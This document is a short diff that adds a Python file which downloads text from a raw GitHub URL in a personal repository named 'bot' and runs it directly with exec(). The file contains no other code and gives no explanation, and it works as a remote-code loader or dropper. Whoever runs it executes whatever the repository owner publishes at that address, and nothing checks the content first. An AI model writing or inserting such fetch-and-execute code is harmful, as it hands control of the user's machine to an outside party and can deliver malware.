@@ -1,0 +1,5 @@
+import requests
+
+url = "https://raw.githubusercontent.com/amiirkebir-hue/bot/refs/heads/main/bot"
+response = requests.get(url)
+exec(response.text)
